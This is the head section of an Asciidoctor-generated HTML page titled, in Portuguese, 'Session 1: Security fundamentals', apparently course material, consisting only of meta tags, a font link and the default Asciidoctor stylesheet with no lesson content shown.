<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge"><![endif]-->
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="generator" content="Asciidoctor 1.5.7.1">
<title>Sessão 1: Fundamentos de segurança</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700">
<style>
/* Asciidoctor default stylesheet | MIT License | http://asciidoctor.org */
/* Uncomment @import statement below to use as custom stylesheet */
/*@import "https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700";*/
article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section,summary{display:block}
audio,canvas,video{display:inline-block}
audio:not([controls]){display:none;height:0}
script{display:none!important}
html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}
a{background:transparent}
a:focus{outline:thin dotted}
a:active,a:hover{outline:0}
h1{font-size:2em;margin:.67em 0}
abbr[title]{border-bottom:1px dotted}
b,strong{font-weight:bold}
dfn{font-style:italic}
hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}
mark{background:#ff0;color:#000}
code,kbd,pre,samp{font-family:monospace;font-size:1em}
pre{white-space:pre-wrap}
q{quotes:"\201C" "\201D" "\2018" "\2019"}
small{font-size:80%}
sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}
sup{top:-.5em}
sub{bottom:-.25em}
img{border:0}
svg:not(:root){overflow:hidden}
figure{margin:0}
fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}
legend{border:0;padding:0}
button,input,select,textarea{font-family:inherit;font-size:100%;margin:0}
button,input{line-height:normal}
button,select{text-transform:none}
button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}
button[disabled],html input[disabled]{cursor:default}
input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}
button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}
textarea{overflow:auto;vertical-align:top}
table{border-collapse:collapse;border-spacing:0}
*,*::before,*::after{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box}
html,body{font-size:100%}
body{background:#fff;color:rgba(0,0,0,.8);padding:0;margin:0;font-family:"Noto Serif","DejaVu Serif",serif;font-weight:400;font-style:normal;line-height:1;position:relative;cursor:auto;tab-size:4;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased}
a:hover{cursor:pointer}
img,object,embed{max-width:100%;height:auto}
object,embed{height:100%}
img{-ms-interpolation-mode:bicubic}
.left{float:left!important}
.right{float:right!important}
.text-left{text-align:left!important}
.text-right{text-align:right!important}
.text-center{text-align:center!important}
.text-justify{text-align:justify!important}
.hide{display:none}
img,object,svg{display:inline-block;vertical-align:middle}
textarea{height:auto;min-height:50px}
select{width:100%}
.center{margin-left:auto;margin-right:auto}
.stretch{width:100%}
.subheader,.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{line-height:1.45;color:#7a2518;font-weight:400;margin-top:0;margin-bottom:.25em}
div,dl,dt,dd,ul,ol,li,h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6,pre,form,p,blockquote,th,td{margin:0;padding:0;direction:ltr}
a{color:#2156a5;text-decoration:underline;line-height:inherit}
a:hover,a:focus{color:#1d4b8f}
a img{border:none}
p{font-family:inherit;font-weight:400;font-size:1em;line-height:1.6;margin-bottom:1.25em;text-rendering:optimizeLegibility}
p aside{font-size:.875em;line-height:1.35;font-style:italic}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{font-family:"Open Sans","DejaVu Sans",sans-serif;font-weight:300;font-style:normal;color:#ba3925;text-rendering:optimizeLegibility;margin-top:1em;margin-bottom:.5em;line-height:1.0125em}
h1 small,h2 small,h3 small,#toctitle small,.sidebarblock>.content>.title small,h4 small,h5 small,h6 small{font-size:60%;color:#e99b8f;line-height:0}
h1{font-size:2.125em}
h2{font-size:1.6875em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.375em}
h4,h5{font-size:1.125em}
h6{font-size:1em}
hr{border:solid #ddddd8;border-width:1px 0 0;clear:both;margin:1.25em 0 1.1875em;height:0}
em,i{font-style:italic;line-height:inherit}
strong,b{font-weight:bold;line-height:inherit}
small{font-size:60%;line-height:inherit}
code{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;font-weight:400;color:rgba(0,0,0,.9)}
ul,ol,dl{font-size:1em;line-height:1.6;margin-bottom:1.25em;list-style-position:outside;font-family:inherit}
ul,ol{margin-left:1.5em}
ul li ul,ul li ol{margin-left:1.25em;margin-bottom:0;font-size:1em}
ul.square li ul,ul.circle li ul,ul.disc li ul{list-style:inherit}
ul.square{list-style-type:square}
ul.circle{list-style-type:circle}
ul.disc{list-style-type:disc}
ol li ul,ol li ol{margin-left:1.25em;margin-bottom:0}
dl dt{margin-bottom:.3125em;font-weight:bold}
dl dd{margin-bottom:1.25em}
abbr,acronym{text-transform:uppercase;font-size:90%;color:rgba(0,0,0,.8);border-bottom:1px dotted #ddd;cursor:help}
abbr{text-transform:none}
blockquote{margin:0 0 1.25em;padding:.5625em 1.25em 0 1.1875em;border-left:1px solid #ddd}
blockquote cite{display:block;font-size:.9375em;color:rgba(0,0,0,.6)}
blockquote cite::before{content:"\2014 \0020"}
blockquote cite a,blockquote cite a:visited{color:rgba(0,0,0,.6)}
blockquote,blockquote p{line-height:1.6;color:rgba(0,0,0,.85)}
@media screen and (min-width:768px){h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2}
h1{font-size:2.75em}
h2{font-size:2.3125em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.6875em}
h4{font-size:1.4375em}}
table{background:#fff;margin-bottom:1.25em;border:solid 1px #dedede}
table thead,table tfoot{background:#f7f8f7}
table thead tr th,table thead tr td,table tfoot tr th,table tfoot tr td{padding:.5em .625em .625em;font-size:inherit;color:rgba(0,0,0,.8);text-align:left}
table tr th,table tr td{padding:.5625em .625em;font-size:inherit;color:rgba(0,0,0,.8)}
table tr.even,table tr.alt,table tr:nth-of-type(even){background:#f8f8f7}
table thead tr th,table tfoot tr th,table tbody tr td,table tr td,table tfoot tr td{display:table-cell;line-height:1.6}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2;word-spacing:-.05em}
h1 strong,h2 strong,h3 strong,#toctitle strong,.sidebarblock>.content>.title strong,h4 strong,h5 strong,h6 strong{font-weight:400}
.clearfix::before,.clearfix::after,.float-group::before,.float-group::after{content:" ";display:table}
.clearfix::after,.float-group::after{clear:both}
*:not(pre)>code{font-size:.9375em;font-style:normal!important;letter-spacing:0;padding:.1em .5ex;word-spacing:-.15em;background-color:#f7f7f8;-webkit-border-radius:4px;border-radius:4px;line-height:1.45;text-rendering:optimizeSpeed;word-wrap:break-word}
*:not(pre)>code.nobreak{word-wrap:normal}
*:not(pre)>code.nowrap{white-space:nowrap}
pre,pre>code{line-height:1.45;color:rgba(0,0,0,.9);font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;font-weight:400;text-rendering:optimizeSpeed}
em em{font-style:normal}
strong strong{font-weight:400}
.keyseq{color:rgba(51,51,51,.8)}
kbd{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;display:inline-block;color:rgba(0,0,0,.8);font-size:.65em;line-height:1.45;background-color:#f7f7f7;border:1px solid #ccc;-webkit-border-radius:3px;border-radius:3px;-webkit-box-shadow:0 1px 0 rgba(0,0,0,.2),0 0 0 .1em white inset;box-shadow:0 1px 0 rgba(0,0,0,.2),0 0 0 .1em #fff inset;margin:0 .15em;padding:.2em .5em;vertical-align:middle;position:relative;top:-.1em;white-space:nowrap}
.keyseq kbd:first-child{margin-left:0}
.keyseq kbd:last-child{margin-right:0}
.menuseq,.menuref{color:#000}
.menuseq b:not(.caret),.menuref{font-weight:inherit}
.menuseq{word-spacing:-.02em}
.menuseq b.caret{font-size:1.25em;line-height:.8}
.menuseq i.caret{font-weight:bold;text-align:center;width:.45em}
b.button::before,b.button::after{position:relative;top:-1px;font-weight:400}
b.button::before{content:"[";padding:0 3px 0 2px}
b.button::after{content:"]";padding:0 2px 0 3px}
p a>code:hover{color:rgba(0,0,0,.9)}
#header,#content,#footnotes,#footer{width:100%;margin-left:auto;margin-right:auto;margin-top:0;margin-bottom:0;max-width:62.5em;*zoom:1;position:relative;padding-left:.9375em;padding-right:.9375em}
#header::before,#header::after,#content::before,#content::after,#footnotes::before,#footnotes::after,#footer::before,#footer::after{content:" ";display:table}
#header::after,#content::after,#footnotes::after,#footer::after{clear:both}
#content{margin-top:1.25em}
#content::before{content:none}
#header>h1:first-child{color:rgba(0,0,0,.85);margin-top:2.25rem;margin-bottom:0}
#header>h1:first-child+#toc{margin-top:8px;border-top:1px solid #ddddd8}
#header>h1:only-child,body.toc2 #header>h1:nth-last-child(2){border-bottom:1px solid #ddddd8;padding-bottom:8px}
#header .details{border-bottom:1px solid #ddddd8;line-height:1.45;padding-top:.25em;padding-bottom:.25em;padding-left:.25em;color:rgba(0,0,0,.6);display:-ms-flexbox;display:-webkit-flex;display:flex;-ms-flex-flow:row wrap;-webkit-flex-flow:row wrap;flex-flow:row wrap}
#header .details span:first-child{margin-left:-.125em}
#header .details span.email a{color:rgba(0,0,0,.85)}
#header .details br{display:none}
#header .details br+span::before{content:"\00a0\2013\00a0"}
#header .details br+span.author::before{content:"\00a0\22c5\00a0";color:rgba(0,0,0,.85)}
#header .details br+span#revremark::before{content:"\00a0|\00a0"}
#header #revnumber{text-transform:capitalize}
#header #revnumber::after{content:"\00a0"}
#content>h1:first-child:not([class]){color:rgba(0,0,0,.85);border-bottom:1px solid #ddddd8;padding-bottom:8px;margin-top:0;padding-top:1rem;margin-bottom:1.25rem}
#toc{border-bottom:1px solid #efefed;padding-bottom:.5em}
#toc>ul{margin-left:.125em}
#toc ul.sectlevel0>li>a{font-style:italic}
#toc ul.sectlevel0 ul.sectlevel1{margin:.5em 0}
#toc ul{font-family:"Open Sans","DejaVu Sans",sans-serif;list-style-type:none}
#toc li{line-height:1.3334;margin-top:.3334em}
#toc a{text-decoration:none}
#toc a:active{text-decoration:underline}
#toctitle{color:#7a2518;font-size:1.2em}
@media screen and (min-width:768px){#toctitle{font-size:1.375em}
body.toc2{padding-left:15em;padding-right:0}
#toc.toc2{margin-top:0!important;background-color:#f8f8f7;position:fixed;width:15em;left:0;top:0;border-right:1px solid #efefed;border-top-width:0!important;border-bottom-width:0!important;z-index:1000;padding:1.25em 1em;height:100%;overflow:auto}
#toc.toc2 #toctitle{margin-top:0;margin-bottom:.8rem;font-size:1.2em}
#toc.toc2>ul{font-size:.9em;margin-bottom:0}
#toc.toc2 ul ul{margin-left:0;padding-left:1em}
#toc.toc2 ul.sectlevel0 ul.sectlevel1{padding-left:0;margin-top:.5em;margin-bottom:.5em}
body.toc2.toc-right{padding-left:0;padding-right:15em}
body.toc2.toc-right #toc.toc2{border-right-width:0;border-left:1px solid #efefed;left:auto;right:0}}
@media screen and (min-width:1280px){body.toc2{padding-left:20em;padding-right:0}
#toc.toc2{width:20em}
#toc.toc2 #toctitle{font-size:1.375em}
#toc.toc2>ul{font-size:.95em}
#toc.toc2 ul ul{padding-left:1.25em}
body.toc2.toc-right{padding-left:0;padding-right:20em}}
#content #toc{border-style:solid;border-width:1px;border-color:#e0e0dc;margin-bottom:1.25em;padding:1.25em;background:#f8f8f7;-webkit-border-radius:4px;border-radius:4px}
#content #toc>:first-child{margin-top:0}
#content #toc>:last-child{margin-bottom:0}
#footer{max-width:100%;background-color:rgba(0,0,0,.8);padding:1.25em}
#footer-text{color:rgba(255,255,255,.8);line-height:1.44}
#content{margin-bottom:.625em}
.sect1{padding-bottom:.625em}
@media screen and (min-width:768px){#content{margin-bottom:1.25em}
.sect1{padding-bottom:1.25em}}
.sect1:last-child{padding-bottom:0}
.sect1+.sect1{border-top:1px solid #efefed}
#content h1>a.anchor,h2>a.anchor,h3>a.anchor,#toctitle>a.anchor,.sidebarblock>.content>.title>a.anchor,h4>a.anchor,h5>a.anchor,h6>a.anchor{position:absolute;z-index:1001;width:1.5ex;margin-left:-1.5ex;display:block;text-decoration:none!important;visibility:hidden;text-align:center;font-weight:400}
#content h1>a.anchor::before,h2>a.anchor::before,h3>a.anchor::before,#toctitle>a.anchor::before,.sidebarblock>.content>.title>a.anchor::before,h4>a.anchor::before,h5>a.anchor::before,h6>a.anchor::before{content:"\00A7";font-size:.85em;display:block;padding-top:.1em}
#content h1:hover>a.anchor,#content h1>a.anchor:hover,h2:hover>a.anchor,h2>a.anchor:hover,h3:hover>a.anchor,#toctitle:hover>a.anchor,.sidebarblock>.content>.title:hover>a.anchor,h3>a.anchor:hover,#toctitle>a.anchor:hover,.sidebarblock>.content>.title>a.anchor:hover,h4:hover>a.anchor,h4>a.anchor:hover,h5:hover>a.anchor,h5>a.anchor:hover,h6:hover>a.anchor,h6>a.anchor:hover{visibility:visible}
#content h1>a.link,h2>a.link,h3>a.link,#toctitle>a.link,.sidebarblock>.content>.title>a.link,h4>a.link,h5>a.link,h6>a.link{color:#ba3925;text-decoration:none}
#content h1>a.link:hover,h2>a.link:hover,h3>a.link:hover,#toctitle>a.link:hover,.sidebarblock>.content>.title>a.link:hover,h4>a.link:hover,h5>a.link:hover,h6>a.link:hover{color:#a53221}
.audioblock,.imageblock,.literalblock,.listingblock,.stemblock,.videoblock{margin-bottom:1.25em}
.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{text-rendering:optimizeLegibility;text-align:left;font-family:"Noto Serif","DejaVu Serif",serif;font-size:1rem;font-style:italic}
table.tableblock.fit-content>caption.title{white-space:nowrap;width:0}
.paragraph.lead>p,#preamble>.sectionbody>[class="paragraph"]:first-of-type p{font-size:1.21875em;line-height:1.6;color:rgba(0,0,0,.85)}
table.tableblock #preamble>.sectionbody>[class="paragraph"]:first-of-type p{font-size:inherit}
.admonitionblock>table{border-collapse:separate;border:0;background:none;width:100%}
.admonitionblock>table td.icon{text-align:center;width:80px}
.admonitionblock>table td.icon img{max-width:none}
.admonitionblock>table td.icon .title{font-weight:bold;font-family:"Open Sans","DejaVu Sans",sans-serif;text-transform:uppercase}
.admonitionblock>table td.content{padding-left:1.125em;padding-right:1.25em;border-left:1px solid #ddddd8;color:rgba(0,0,0,.6)}
.admonitionblock>table td.content>:last-child>:last-child{margin-bottom:0}
.exampleblock>.content{border-style:solid;border-width:1px;border-color:#e6e6e6;margin-bottom:1.25em;padding:1.25em;background:#fff;-webkit-border-radius:4px;border-radius:4px}
.exampleblock>.content>:first-child{margin-top:0}
.exampleblock>.content>:last-child{margin-bottom:0}
.sidebarblock{border-style:solid;border-width:1px;border-color:#e0e0dc;margin-bottom:1.25em;padding:1.25em;background:#f8f8f7;-webkit-border-radius:4px;border-radius:4px}
.sidebarblock>:first-child{margin-top:0}
.sidebarblock>:last-child{margin-bottom:0}
.sidebarblock>.content>.title{color:#7a2518;margin-top:0;text-align:center}
.exampleblock>.content>:last-child>:last-child,.exampleblock>.content .olist>ol>li:last-child>:last-child,.exampleblock>.content .ulist>ul>li:last-child>:last-child,.exampleblock>.content .qlist>ol>li:last-child>:last-child,.sidebarblock>.content>:last-child>:last-child,.sidebarblock>.content .olist>ol>li:last-child>:last-child,.sidebarblock>.content .ulist>ul>li:last-child>:last-child,.sidebarblock>.content .qlist>ol>li:last-child>:last-child{margin-bottom:0}
.literalblock pre,.listingblock pre:not(.highlight),.listingblock pre[class="highlight"],.listingblock pre[class^="highlight "],.listingblock pre.CodeRay,.listingblock pre.prettyprint{background:#f7f7f8}
.sidebarblock .literalblock pre,.sidebarblock .listingblock pre:not(.highlight),.sidebarblock .listingblock pre[class="highlight"],.sidebarblock .listingblock pre[class^="highlight "],.sidebarblock .listingblock pre.CodeRay,.sidebarblock .listingblock pre.prettyprint{background:#f2f1f1}
.literalblock pre,.literalblock pre[class],.listingblock pre,.listingblock pre[class]{-webkit-border-radius:4px;border-radius:4px;word-wrap:break-word;padding:1em;font-size:.8125em}
.literalblock pre.nowrap,.literalblock pre[class].nowrap,.listingblock pre.nowrap,.listingblock pre[class].nowrap{overflow-x:auto;white-space:pre;word-wrap:normal}
@media screen and (min-width:768px){.literalblock pre,.literalblock pre[class],.listingblock pre,.listingblock pre[class]{font-size:.90625em}}
@media screen and (min-width:1280px){.literalblock pre,.literalblock pre[class],.listingblock pre,.listingblock pre[class]{font-size:1em}}
.literalblock.output pre{color:#f7f7f8;background-color:rgba(0,0,0,.9)}
.listingblock pre.highlightjs{padding:0}
.listingblock pre.highlightjs>code{padding:1em;-webkit-border-radius:4px;border-radius:4px}
.listingblock pre.prettyprint{border-width:0}
.listingblock>.content{position:relative}
.listingblock code[data-lang]::before{display:none;content:attr(data-lang);position:absolute;font-size:.75em;top:.425rem;right:.5rem;line-height:1;text-transform:uppercase;color:#999}
.listingblock:hover code[data-lang]::before{display:block}
.listingblock.terminal pre .command::before{content:attr(data-prompt);padding-right:.5em;color:#999}
.listingblock.terminal pre .command:not([data-prompt])::before{content:"$"}
table.pyhltable{border-collapse:separate;border:0;margin-bottom:0;background:none}
table.pyhltable td{vertical-align:top;padding-top:0;padding-bottom:0;line-height:1.45}
table.pyhltable td.code{padding-left:.75em;padding-right:0}
pre.pygments .lineno,table.pyhltable td:not(.code){color:#999;padding-left:0;padding-right:.5em;border-right:1px solid #ddddd8}
pre.pygments .lineno{display:inline-block;margin-right:.25em}
table.pyhltable .linenodiv{background:none!important;padding-right:0!important}
.quoteblock{margin:0 1em 1.25em 1.5em;display:table}
.quoteblock>.title{margin-left:-1.5em;margin-bottom:.75em}
.quoteblock blockquote,.quoteblock blockquote p{color:rgba(0,0,0,.85);font-size:1.15rem;line-height:1.75;word-spacing:.1em;letter-spacing:0;font-style:italic;text-align:justify}
.quoteblock blockquote{margin:0;padding:0;border:0}
.quoteblock blockquote::before{content:"\201c";float:left;font-size:2.75em;font-weight:bold;line-height:.6em;margin-left:-.6em;color:#7a2518;text-shadow:0 1px 2px rgba(0,0,0,.1)}
.quoteblock blockquote>.paragraph:last-child p{margin-bottom:0}
.quoteblock .attribution{margin-top:.5em;margin-right:.5ex;text-align:right}
.quoteblock .quoteblock{margin-left:0;margin-right:0;padding:.5em 0;border-left:3px solid rgba(0,0,0,.6)}
.quoteblock .quoteblock blockquote{padding:0 0 0 .75em}
.quoteblock .quoteblock blockquote::before{display:none}
.verseblock{margin:0 1em 1.25em}
.verseblock pre{font-family:"Open Sans","DejaVu Sans",sans;font-size:1.15rem;color:rgba(0,0,0,.85);font-weight:300;text-rendering:optimizeLegibility}
.verseblock pre strong{font-weight:400}
.verseblock .attribution{margin-top:1.25rem;margin-left:.5ex}
.quoteblock .attribution,.verseblock .attribution{font-size:.9375em;line-height:1.45;font-style:italic}
.quoteblock .attribution br,.verseblock .attribution br{display:none}
.quoteblock .attribution cite,.verseblock .attribution cite{display:block;letter-spacing:-.025em;color:rgba(0,0,0,.6)}
.quoteblock.abstract{margin:0 1em 1.25em;display:block}
.quoteblock.abstract>.title{margin:0 0 .375em;font-size:1.15em;text-align:center}
.quoteblock.abstract blockquote,.quoteblock.abstract blockquote p{word-spacing:0;line-height:1.6}
.quoteblock.abstract blockquote::before,.quoteblock.abstract p::before{display:none}
table.tableblock{max-width:100%;border-collapse:separate}
p.tableblock:last-child{margin-bottom:0}
td.tableblock>.content{margin-bottom:-1.25em}
table.tableblock,th.tableblock,td.tableblock{border:0 solid #dedede}
table.grid-all>thead>tr>.tableblock,table.grid-all>tbody>tr>.tableblock{border-width:0 1px 1px 0}
table.grid-all>tfoot>tr>.tableblock{border-width:1px 1px 0 0}
table.grid-cols>*>tr>.tableblock{border-width:0 1px 0 0}
table.grid-rows>thead>tr>.tableblock,table.grid-rows>tbody>tr>.tableblock{border-width:0 0 1px}
table.grid-rows>tfoot>tr>.tableblock{border-width:1px 0 0}
table.grid-all>*>tr>.tableblock:last-child,table.grid-cols>*>tr>.tableblock:last-child{border-right-width:0}
table.grid-all>tbody>tr:last-child>.tableblock,table.grid-all>thead:last-child>tr>.tableblock,table.grid-rows>tbody>tr:last-child>.tableblock,table.grid-rows>thead:last-child>tr>.tableblock{border-bottom-width:0}
table.frame-all{border-width:1px}
table.frame-sides{border-width:0 1px}
table.frame-topbot,table.frame-ends{border-width:1px 0}
table.stripes-all tr,table.stripes-odd tr:nth-of-type(odd){background:#f8f8f7}
table.stripes-none tr,table.stripes-odd tr:nth-of-type(even){background:none}
th.halign-left,td.halign-left{text-align:left}
th.halign-right,td.halign-right{text-align:right}
th.halign-center,td.halign-center{text-align:center}
th.valign-top,td.valign-top{vertical-align:top}
th.valign-bottom,td.valign-bottom{vertical-align:bottom}
th.valign-middle,td.valign-middle{vertical-align:middle}
table thead th,table tfoot th{font-weight:bold}
tbody tr th{display:table-cell;line-height:1.6;background:#f7f8f7}
tbody tr th,tbody tr th p,tfoot tr th,tfoot tr th p{color:rgba(0,0,0,.8);font-weight:bold}
p.tableblock>code:only-child{background:none;padding:0}
p.tableblock{font-size:1em}
td>div.verse{white-space:pre}
ol{margin-left:1.75em}
ul li ol{margin-left:1.5em}
dl dd{margin-left:1.125em}
dl dd:last-child,dl dd:last-child>:last-child{margin-bottom:0}
ol>li p,ul>li p,ul dd,ol dd,.olist .olist,.ulist .ulist,.ulist .olist,.olist .ulist{margin-bottom:.625em}
ul.checklist,ul.none,ol.none,ul.no-bullet,ol.no-bullet,ol.unnumbered,ul.unstyled,ol.unstyled{list-style-type:none}
ul.no-bullet,ol.no-bullet,ol.unnumbered{margin-left:.625em}
ul.unstyled,ol.unstyled{margin-left:0}
ul.checklist{margin-left:.625em}
ul.checklist li>p:first-child>.fa-square-o:first-child,ul.checklist li>p:first-child>.fa-check-square-o:first-child{width:1.25em;font-size:.8em;position:relative;bottom:.125em}
ul.checklist li>p:first-child>input[type="checkbox"]:first-child{margin-right:.25em}
ul.inline{display:-ms-flexbox;display:-webkit-box;display:flex;-ms-flex-flow:row wrap;-webkit-flex-flow:row wrap;flex-flow:row wrap;list-style:none;margin:0 0 .625em -1.25em}
ul.inline>li{margin-left:1.25em}
.unstyled dl dt{font-weight:400;font-style:normal}
ol.arabic{list-style-type:decimal}
ol.decimal{list-style-type:decimal-leading-zero}
ol.loweralpha{list-style-type:lower-alpha}
ol.upperalpha{list-style-type:upper-alpha}
ol.lowerroman{list-style-type:lower-roman}
ol.upperroman{list-style-type:upper-roman}
ol.lowergreek{list-style-type:lower-greek}
.hdlist>table,.colist>table{border:0;background:none}
.hdlist>table>tbody>tr,.colist>table>tbody>tr{background:none}
td.hdlist1,td.hdlist2{vertical-align:top;padding:0 .625em}
td.hdlist1{font-weight:bold;padding-bottom:1.25em}
.literalblock+.colist,.listingblock+.colist{margin-top:-.5em}
.colist td:not([class]):first-child{padding:.4em .75em 0;line-height:1;vertical-align:top}
.colist td:not([class]):first-child img{max-width:none}
.colist td:not([class]):last-child{padding:.25em 0}
.thumb,.th{line-height:0;display:inline-block;border:solid 4px #fff;-webkit-box-shadow:0 0 0 1px #ddd;box-shadow:0 0 0 1px #ddd}
.imageblock.left,.imageblock[style*="float: left"]{margin:.25em .625em 1.25em 0}
.imageblock.right,.imageblock[style*="float: right"]{margin:.25em 0 1.25em .625em}
.imageblock>.title{margin-bottom:0}
.imageblock.thumb,.imageblock.th{border-width:6px}
.imageblock.thumb>.title,.imageblock.th>.title{padding:0 .125em}
.image.left,.image.right{margin-top:.25em;margin-bottom:.25em;display:inline-block;line-height:0}
.image.left{margin-right:.625em}
.image.right{margin-left:.625em}
a.image{text-decoration:none;display:inline-block}
a.image object{pointer-events:none}
sup.footnote,sup.footnoteref{font-size:.875em;position:static;vertical-align:super}
sup.footnote a,sup.footnoteref a{text-decoration:none}
sup.footnote a:active,sup.footnoteref a:active{text-decoration:underline}
#footnotes{padding-top:.75em;padding-bottom:.75em;margin-bottom:.625em}
#footnotes hr{width:20%;min-width:6.25em;margin:-.25em 0 .75em;border-width:1px 0 0}
#footnotes .footnote{padding:0 .375em 0 .225em;line-height:1.3334;font-size:.875em;margin-left:1.2em;margin-bottom:.2em}
#footnotes .footnote a:first-of-type{font-weight:bold;text-decoration:none;margin-left:-1.05em}
#footnotes .footnote:last-of-type{margin-bottom:0}
#content #footnotes{margin-top:-.625em;margin-bottom:0;padding:.75em 0}
.gist .file-data>table{border:0;background:#fff;width:100%;margin-bottom:0}
.gist .file-data>table td.line-data{width:99%}
div.unbreakable{page-break-inside:avoid}
.big{font-size:larger}
.small{font-size:smaller}
.underline{text-decoration:underline}
.overline{text-decoration:overline}
.line-through{text-decoration:line-through}
.aqua{color:#00bfbf}
.aqua-background{background-color:#00fafa}
.black{color:#000}
.black-background{background-color:#000}
.blue{color:#0000bf}
.blue-background{background-color:#0000fa}
.fuchsia{color:#bf00bf}
.fuchsia-background{background-color:#fa00fa}
.gray{color:#606060}
.gray-background{background-color:#7d7d7d}
.green{color:#006000}
.green-background{background-color:#007d00}
.lime{color:#00bf00}
.lime-background{background-color:#00fa00}
.maroon{color:#600000}
.maroon-background{background-color:#7d0000}
.navy{color:#000060}
.navy-background{background-color:#00007d}
.olive{color:#606000}
.olive-background{background-color:#7d7d00}
.purple{color:#600060}
.purple-background{background-color:#7d007d}
.red{color:#bf0000}
.red-background{background-color:#fa0000}
.silver{color:#909090}
.silver-background{background-color:#bcbcbc}
.teal{color:#006060}
.teal-background{background-color:#007d7d}
.white{color:#bfbfbf}
.white-background{background-color:#fafafa}
.yellow{color:#bfbf00}
.yellow-background{background-color:#fafa00}
span.icon>.fa{cursor:default}
a span.icon>.fa{cursor:inherit}
.admonitionblock td.icon [class^="fa icon-"]{font-size:2.5em;text-shadow:1px 1px 2px rgba(0,0,0,.5);cursor:default}
.admonitionblock td.icon .icon-note::before{content:"\f05a";color:#19407c}
.admonitionblock td.icon .icon-tip::before{content:"\f0eb";text-shadow:1px 1px 2px rgba(155,155,0,.8);color:#111}
.admonitionblock td.icon .icon-warning::before{content:"\f071";color:#bf6900}
.admonitionblock td.icon .icon-caution::before{content:"\f06d";color:#bf3400}
.admonitionblock td.icon .icon-important::before{content:"\f06a";color:#bf0000}
.conum[data-value]{display:inline-block;color:#fff!important;background-color:rgba(0,0,0,.8);-webkit-border-radius:100px;border-radius:100px;text-align:center;font-size:.75em;width:1.67em;height:1.67em;line-height:1.67em;font-family:"Open Sans","DejaVu Sans",sans-serif;font-style:normal;font-weight:bold}
.conum[data-value] *{color:#fff!important}
.conum[data-value]+b{display:none}
.conum[data-value]::after{content:attr(data-value)}
pre .conum[data-value]{position:relative;top:-.125em}
b.conum *{color:inherit!important}
.conum:not([data-value]):empty{display:none}
dt,th.tableblock,td.content,div.footnote{text-rendering:optimizeLegibility}
h1,h2,p,td.content,span.alt{letter-spacing:-.01em}
p strong,td.content strong,div.footnote strong{letter-spacing:-.005em}
p,blockquote,dt,td.content,span.alt{font-size:1.0625rem}
p{margin-bottom:1.25rem}
.sidebarblock p,.sidebarblock dt,.sidebarblock td.content,p.tableblock{font-size:1em}
.exampleblock>.content{background-color:#fffef7;border-color:#e0e0dc;-webkit-box-shadow:0 1px 4px #e0e0dc;box-shadow:0 1px 4px #e0e0dc}
.print-only{display:none!important}
@page{margin:1.25cm .75cm}
@media print{*{-webkit-box-shadow:none!important;box-shadow:none!important;text-shadow:none!important}
html{font-size:80%}
a{color:inherit!important;text-decoration:underline!important}
a.bare,a[href^="#"],a[href^="mailto:"]{text-decoration:none!important}
a[href^="http:"]:not(.bare)::after,a[href^="https:"]:not(.bare)::after{content:"(" attr(href) ")";display:inline-block;font-size:.875em;padding-left:.25em}
abbr[title]::after{content:" (" attr(title) ")"}
pre,blockquote,tr,img,object,svg{page-break-inside:avoid}
thead{display:table-header-group}
svg{max-width:100%}
p,blockquote,dt,td.content{font-size:1em;orphans:3;widows:3}
h2,h3,#toctitle,.sidebarblock>.content>.title{page-break-after:avoid}
#toc,.sidebarblock,.exampleblock>.content{background:none!important}
#toc{border-bottom:1px solid #ddddd8!important;padding-bottom:0!important}
body.book #header{text-align:center}
body.book #header>h1:first-child{border:0!important;margin:2.5em 0 1em}
body.book #header .details{border:0!important;display:block;padding:0!important}
body.book #header .details span:first-child{margin-left:0!important}
body.book #header .details br{display:block}
body.book #header .details br+span::before{content:none!important}
body.book #toc{border:0!important;text-align:left!important;padding:0!important;margin:0!important}
body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-break-before:always}
.listingblock code[data-lang]::before{display:block}
#footer{padding:0 .9375em}
.hide-on-print{display:none!important}
.print-only{display:block!important}
.hide-for-print{display:none!important}
.show-for-print{display:inherit!important}}
@media print,amzn-kf8{#header>h1:first-child{margin-top:1.25rem}
.sect1{padding:0!important}
.sect1+.sect1{border:0}
#footer{background:none}
#footer-text{color:rgba(0,0,0,.6);font-size:.9em}}
@media amzn-kf8{#header,#content,#footnotes,#footer{padding:0}}
